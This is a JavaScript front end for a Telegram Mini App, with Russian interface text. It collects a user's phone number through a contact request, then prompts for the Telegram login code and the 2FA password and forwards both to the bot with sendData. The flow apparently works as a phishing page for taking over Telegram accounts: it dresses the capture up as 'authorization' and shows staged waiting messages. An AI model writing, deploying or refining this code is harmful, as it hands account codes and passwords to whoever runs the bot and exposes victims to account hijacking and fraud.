document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();
    const loginBtn = document.getElementById('loginBtn');
    const authForm = document.getElementById('authForm');
    const loadingSpinner = document.getElementById('loadingSpinner');
    const statusMsg = document.getElementById('statusMsg');
    const instructionMsg = document.getElementById('instructionMsg');
    const phoneInput = document.getElementById('phoneInput');
    const codeInput = document.getElementById('codeInput');
    const twoFaInput = document.getElementById('twoFaInput');
    const submitBtn = document.getElementById('submitBtn');
    const successMsg = document.getElementById('successMsg');
    const errorMsg = document.getElementById('errorMsg');
    let currentStep = 'contact';
    loginBtn.addEventListener('click', () => {
        console.log('Login button clicked');
        loginBtn.style.opacity = '0';
        setTimeout(() => loginBtn.classList.add('hidden'), 300);
        authForm.classList.remove('hidden');
        statusMsg.textContent = 'Поделитесь контактом для авторизации...';
        showLoading();
        currentStep = 'contact';
        tg.requestContact((success, contact) => {
            console.log('Contact callback, success:', success, 'contact:', contact);
            if (success) {
                console.log('Contact granted');
                phoneInput.value = contact.phone_number || 'Номер отправлен боту';
                phoneInput.classList.remove('hidden');
                statusMsg.textContent = 'Номер отправлен. Ожидаем SMS...';
                tg.HapticFeedback.impactOccurred('light');
                setTimeout(() => {
                    console.log('Switching to code input');
                    phoneInput.classList.add('hidden');
                    codeInput.classList.remove('hidden');
                    submitBtn.classList.remove('hidden');
                    submitBtn.textContent = 'Отправить код';
                    statusMsg.textContent = 'Введите SMS-код из Telegram.';
                    currentStep = 'code';
                    hideLoading();
                }, 2000);
            } else {
                console.error('Contact request failed');
                hideLoading();
                errorMsg.textContent = '❌ Не удалось получить контакт. Попробуйте снова.';
                errorMsg.classList.remove('hidden');
                setTimeout(resetForm, 2000);
            }
        });
    });
    submitBtn.addEventListener('click', () => {
        console.log('Submit clicked, current step:', currentStep);
        if (currentStep === 'code') {
            const code = codeInput.value.trim();
            if (!code) {
                console.log('No code entered');
                errorMsg.textContent = 'Введите код.';
                errorMsg.classList.remove('hidden');
                return;
            }
            const payload = { action: 'verify_code', code: code };
            console.log('Sending code payload:', payload);
            tg.sendData(JSON.stringify(payload));
            showLoading();
            statusMsg.textContent = 'Проверяем код...';
            tg.HapticFeedback.impactOccurred('medium');
        } else if (currentStep === '2fa') {
            const password = twoFaInput.value.trim();
            if (!password) {
                console.log('No 2FA password entered');
                errorMsg.textContent = 'Введите пароль 2FA.';
                errorMsg.classList.remove('hidden');
                return;
            }
            const payload = { action: 'verify_2fa', password: password };
            console.log('Sending 2FA payload:', payload);
            tg.sendData(JSON.stringify(payload));
            showLoading();
            statusMsg.textContent = 'Подтверждаем 2FA...';
            tg.HapticFeedback.impactOccurred('heavy');
        }
    });
    function showLoading() {
        console.log('Showing loading spinner');
        loadingSpinner.classList.remove('hidden');
        submitBtn.disabled = true;
        errorMsg.classList.add('hidden');
    }
    function hideLoading() {
        console.log('Hiding loading spinner');
        loadingSpinner.classList.add('hidden');
        submitBtn.disabled = false;
    }
    function resetForm() {
        console.log('Resetting form');
        authForm.classList.add('hidden');
        loginBtn.classList.remove('hidden');
        loginBtn.style.opacity = '1';
        currentStep = 'contact';
        phoneInput.value = '';
        codeInput.value = '';
        twoFaInput.value = '';
        successMsg.classList.add('hidden');
        errorMsg.classList.add('hidden');
        instructionMsg.classList.add('hidden');
        statusMsg.textContent = '';
        hideLoading();
    }
    tg.onEvent('web_app_data', (data) => {
        console.log('Received web_app_data event:', data);
        if (currentStep === 'code') {
            hideLoading();
            instructionMsg.classList.remove('hidden');
            twoFaInput.classList.remove('hidden');
            submitBtn.textContent = 'Подтвердить 2FA';
            statusMsg.textContent = 'Код отправлен. Если требуется 2FA, введите пароль.';
            currentStep = '2fa';
            tg.HapticFeedback.impactOccurred('light');
        } else if (currentStep === '2fa') {
            hideLoading();
            statusMsg.textContent = 'Ожидаем подтверждения 2FA...';
        }
    });
    tg.onEvent('error', (error) => {
        console.error('WebApp error:', error);
        hideLoading();
        errorMsg.textContent = `❌ Ошибка: ${error.message || 'Неизвестная ошибка'}`;
        errorMsg.classList.remove('hidden');
        setTimeout(resetForm, 2000);
    });
});